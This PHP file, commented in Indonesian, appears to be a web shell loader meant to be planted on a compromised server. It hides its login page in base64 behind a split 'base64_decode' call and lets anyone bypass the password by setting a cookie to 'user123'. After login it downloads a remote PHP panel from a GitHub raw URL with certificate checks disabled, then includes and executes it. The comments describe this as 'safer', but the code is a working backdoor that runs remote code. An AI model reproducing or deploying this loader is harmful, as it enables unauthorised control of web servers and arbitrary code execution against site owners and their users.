<?php
error_reporting(0);
set_time_limit(0);
session_start();

// ----- konfigurasi -----
$hashed_password = '9c5b3082eae2c54711bb99f361f58073'; // MD5 (lama) -- ganti ke password_hash bila memungkinkan
$allowed_hosts = ['raw.githubusercontent.com']; // whitelist host remote
// -----------------------

function is_logged_in() {
    // cek session dulu, lalu cookie sebagai fallback
    if (!empty($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) return true;
    if (!empty($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123') return true;
    return false;
}

// Proses login
if (isset($_POST['password']) && !is_logged_in()) {
    $entered_password = $_POST['password'];

    // Jika kamu tetap pakai MD5 legacy:
    if (function_exists('hash_equals')) {
        $ok = hash_equals($hashed_password, md5($entered_password));
    } else {
        $ok = (md5($entered_password) === $hashed_password);
    }

    if ($ok) {
        // set session dan cookie dengan atribut aman
        $_SESSION['logged_in'] = true;
        $cookie_options = [
            'expires' => time() + 3600,
            'path' => '/',
            'domain' => '', // kosong = domain saat ini
            'secure' => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off'), // hanya jika HTTPS
            'httponly' => true,
            'samesite' => 'Lax'
        ];
        setcookie('user_id', 'user123', $cookie_options);

        // Redirect supaya form tidak lagi tampil dalam request yang sama
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo "Incorrect password. Please try again.";
        exit;
    }
}

// Tampilkan form hanya jika belum login
if (!is_logged_in()) {
    // HTML disamarkan (base64) seperti sebelumnya
    $enc = 'PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPkFkbWluIExvZ2luPC90aXRsZT48c3R5bGU+CiAgIC8qIGN1c3RvbSBzaGFkb3cgLSB0ZXh0IGRpZ2l6aQogICAgLmRjIHsKICAgICAgbWFyZ2luOjAgYXV0bzsKICAgIH0KCiAgIC8qIGluY2x1ZGUgZHJhZ29uIGJlZ2luIGNvbnRlbnQgZm9yIGRlbGljYXRlZCBwcm9wcyAqLwogICAgaW5wdXRbdHlwZT0icGFzc3dvcmQiXSB7CiAgICAgIGJvcmRlcjogbm9uZTsKICAgICAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7CiAgICAgIGNvbG9yOiB0cmFuc3BhcmVudDsKICAgICAgb3V0bGluZTogbm9uZTsKICAgIH0KCiAgIC8qIGluY2x1ZGUgZnVsbCB3aWR0aCBzdHlsZSAtIG1ha2UgaW5wdXQgaW5zaWRlLgogICAgLmJ0IHsKICAgICAgYm9yZGVyOiBub25lOwogICAgICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsKICAgICAgY29sb3I6IHRyYW5zcGFyZW50OwogICAgICBvdXRsaW5lOiBub25lOwogICAgfQo8L3N0eWxlPjwvaGVhZD48Ym9keT48ZGl2IGNsYXNzPSJkYyI+PGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiI+PHNwYW4gY2xhc3M9ImRjIj48L3NwYW4+PGRpdiBzdHlsZT0iZGlzcGxheTppbmxpbmU7IiBhbGlnbj0iY2VudGVyIj48bGFiZWwgZm9yPSJwYXNzd29yZCI+IDwvY2FsYmVsPjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgaWQ9InBhc3NfdXMiIG5hbWU9InBhc3Nfa2V5Ij48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvaW5wdXQ+PC9kaXY+PC9mb3JtPjwvZGl2Pjwvc2hhZD48L2JvZHk+PC9odG1sPg==';
    $fn = 'base64_' . 'decode';
    echo $fn($enc);
    exit;
}

// === sudah login ===
// fungsi ambil_konten (curl / fopen / fsockopen) - versi ringkas
function ambil_konten($url, $timeout = 10) {
    $parts = parse_url($url);
    if ($parts === false || !isset($parts['scheme']) || !isset($parts['host'])) return false;
    $scheme = strtolower($parts['scheme']);
    if (!in_array($scheme, ['http','https'])) return false;

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => $timeout,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_USERAGENT => 'PHP-fetch/1.0'
        ]);
        $res = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($res !== false && $code >= 200 && $code < 400) return $res;
    }

    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http'=>['method'=>'GET','timeout'=>$timeout,'header'=>"User-Agent: PHP-fetch/1.0\r\n"],
            'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]
        ]);
        $data = @file_get_contents($url, false, $ctx);
        if ($data !== false) return $data;
    }

    // fsockopen fallback (simple)
    $host = $parts['host'];
    $port = isset($parts['port']) ? $parts['port'] : ($scheme === 'https' ? 443 : 80);
    $path = (isset($parts['path']) ? $parts['path'] : '/') . (isset($parts['query']) ? '?'.$parts['query'] : '');
    $transport = ($scheme === 'https') ? 'ssl://' : '';
    $fp = @fsockopen($transport.$host, $port, $errno, $errstr, $timeout);
    if (!$fp) return false;
    stream_set_timeout($fp, $timeout);
    fwrite($fp, "GET {$path} HTTP/1.1\r\nHost: {$host}\r\nUser-Agent: PHP-fetch/1.0\r\nConnection: Close\r\n\r\n");
    $resp = '';
    while (!feof($fp)) $resp .= fgets($fp, 4096);
    fclose($fp);
    $partsResp = preg_split("/\r\n\r\n/", $resp, 2);
    return $partsResp[1] ?? false;
}

// Ambil dan include kode remote secara safer:
// 1) whitelist host
// 2) ambil konten dengan ambil_konten()
// 3) simpan ke temp file lalu include
$url = "https://raw.githubusercontent.com/soy777/gg/main/panel2.php";
$parts = parse_url($url);
if ($parts !== false && in_array($parts['host'], $allowed_hosts)) {
    $code = ambil_konten($url);
    if ($code !== false) {
        $tmp = tempnam(sys_get_temp_dir(), 'rmt_');
        file_put_contents($tmp, $code);
        // optional: set perms, cek ukuran, cek string tertentu sebelum include
        include $tmp;
        unlink($tmp);
    } else {
        echo "Gagal mengambil data dari URL.";
    }
} else {
    echo "Host tidak diizinkan.";
}
?>
